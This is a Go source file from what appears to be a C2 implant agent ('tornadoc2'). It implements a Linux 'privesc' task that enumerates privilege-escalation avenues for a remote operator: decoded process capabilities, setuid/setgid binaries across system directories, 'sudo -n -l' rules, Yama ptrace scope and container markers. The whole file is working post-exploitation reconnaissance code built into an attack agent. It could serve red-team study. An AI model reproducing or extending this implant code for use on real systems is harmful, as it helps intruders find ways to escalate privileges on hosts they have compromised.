//go:build linux

package core

import (
	"context"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"tornadoc2/agent/protocol"
)

// privescVerb is Linux-only local privilege reconnaissance. It never
// changes state, so it carries no build tag: the output is a few KiB.
func (a *Agent) privescVerb(ctx context.Context, t protocol.Task) Result {
	sub := "summary"
	if len(t.Args) > 0 {
		sub = strings.ToLower(t.Args[0])
	}
	var b strings.Builder
	section := func(title, body string) {
		b.WriteString("== " + title + " ==\n")
		b.WriteString(strings.TrimRight(body, "\n"))
		b.WriteString("\n\n")
	}

	switch sub {
	case "caps":
		section("capabilities", readCapabilities())
	case "suid":
		section("suid/sgid", findSuid())
	case "sudo":
		section("sudo", sudoRules())
	case "ptrace":
		section("ptrace", ptraceScope())
	case "container":
		section("container", containerFacts())
	case "summary":
		section("identity", idFacts())
		section("capabilities", readCapabilities())
		section("ptrace", ptraceScope())
		section("container", containerFacts())
	default:
		return Result{ID: t.ID,
			Error: "usage: privesc caps|suid|sudo|ptrace|container|summary"}
	}
	return Result{ID: t.ID, Output: encodeOutput([]byte(b.String()))}
}

func idFacts() string {
	var lines []string
	for _, f := range []string{"uid_map", "gid_map"} {
		if data, err := os.ReadFile("/proc/self/" + f); err == nil {
			lines = append(lines, f+": "+strings.TrimSpace(string(data)))
		}
	}
	if out, err := exec.Command("id").Output(); err == nil {
		lines = append(lines, "id: "+strings.TrimSpace(string(out)))
	}
	if data, err := os.ReadFile("/proc/self/status"); err == nil {
		for _, l := range strings.Split(string(data), "\n") {
			if strings.HasPrefix(l, "CapInh:") ||
				strings.HasPrefix(l, "CapPrm:") ||
				strings.HasPrefix(l, "CapEff:") ||
				strings.HasPrefix(l, "NoNewPrivs:") ||
				strings.HasPrefix(l, "Seccomp:") {
				lines = append(lines, l)
			}
		}
	}
	return strings.Join(lines, "\n")
}

func readCapabilities() string {
	data, err := os.ReadFile("/proc/self/status")
	if err != nil {
		return err.Error()
	}
	var out []string
	for _, l := range strings.Split(string(data), "\n") {
		if strings.HasPrefix(l, "CapEff:") ||
			strings.HasPrefix(l, "CapPrm:") {
			out = append(out, l)
		}
	}
	if len(out) == 0 {
		return "no capability fields"
	}
	if dec, err := strconv.ParseUint(
		strings.TrimSpace(strings.Split(out[0], ":")[1]), 16, 64); err == nil {
		for i, name := range capNames {
			if dec&(1<<uint(i)) != 0 {
				out = append(out, "  +"+name)
			}
		}
	}
	return strings.Join(out, "\n")
}

// capNames is the Linux capability order, used only for decoding.
var capNames = []string{
	"chown", "dac_override", "dac_read_search", "fowner", "fsetid",
	"kill", "setgid", "setuid", "setpcap", "linux_immutable",
	"net_bind_service", "net_broadcast", "net_admin", "net_raw",
	"ipc_lock", "ipc_owner", "sys_module", "sys_rawio", "sys_chroot",
	"sys_ptrace", "sys_pacct", "sys_admin", "sys_boot", "sys_nice",
	"sys_resource", "sys_time", "sys_tty_config", "mknod", "lease",
	"audit_write", "audit_control", "setfcap", "mac_override",
	"mac_admin", "syslog", "wake_alarm", "block_suspend", "audit_read",
}

func findSuid() string {
	roots := []string{"/usr/bin", "/usr/sbin", "/bin", "/sbin",
		"/usr/local/bin", "/usr/local/sbin", "/opt"}
	var out []string
	deadline := time.Now().Add(5 * time.Second)
	for _, root := range roots {
		if len(out) >= 400 || time.Now().After(deadline) {
			break
		}
		_ = filepath.WalkDir(root, func(p string, d os.DirEntry, err error) error {
			if err != nil {
				return nil
			}
			if len(out) >= 400 || time.Now().After(deadline) {
				return filepath.SkipAll
			}
			if d.IsDir() {
				return nil
			}
			info, err := d.Info()
			if err != nil {
				return nil
			}
			if info.Mode()&(os.ModeSetuid|os.ModeSetgid) != 0 &&
				info.Mode().IsRegular() {
				out = append(out, info.Mode().String()+" "+p)
			}
			return nil
		})
	}
	if len(out) == 0 {
		return "none found"
	}
	return strings.Join(out, "\n")
}

func sudoRules() string {
	out, err := exec.Command("sudo", "-n", "-l").CombinedOutput()
	if err != nil && len(out) == 0 {
		return err.Error()
	}
	return string(out)
}

func ptraceScope() string {
	data, err := os.ReadFile("/proc/sys/kernel/yama/ptrace_scope")
	if err != nil {
		return "yama not present (ptrace unrestricted by LSM)"
	}
	return "yama/ptrace_scope=" + strings.TrimSpace(string(data))
}

func containerFacts() string {
	var out []string
	if _, err := os.Stat("/.dockerenv"); err == nil {
		out = append(out, "docker marker present")
	}
	if _, err := os.Stat("/run/.containerenv"); err == nil {
		out = append(out, "podman marker present")
	}
	if data, err := os.ReadFile("/proc/1/cgroup"); err == nil {
		s := string(data)
		for _, m := range []string{"docker", "kubepods", "lxc",
			"containerd", "podman", "systemd"} {
			if strings.Contains(s, m) {
				out = append(out, "cgroup: "+m)
			}
		}
	}
	if data, err := os.ReadFile("/proc/self/status"); err == nil {
		for _, l := range strings.Split(string(data), "\n") {
			if strings.HasPrefix(l, "Seccomp:") {
				out = append(out, l)
			}
		}
	}
	for _, f := range []string{"/proc/1/sched", "/proc/self/uid_map"} {
		if data, err := os.ReadFile(f); err == nil {
			out = append(out, f+": "+
				strings.TrimSpace(strings.SplitN(string(data),
					"\n", 2)[0]))
		}
	}
	if len(out) == 0 {
		return "no container markers"
	}
	return strings.Join(out, "\n")
}
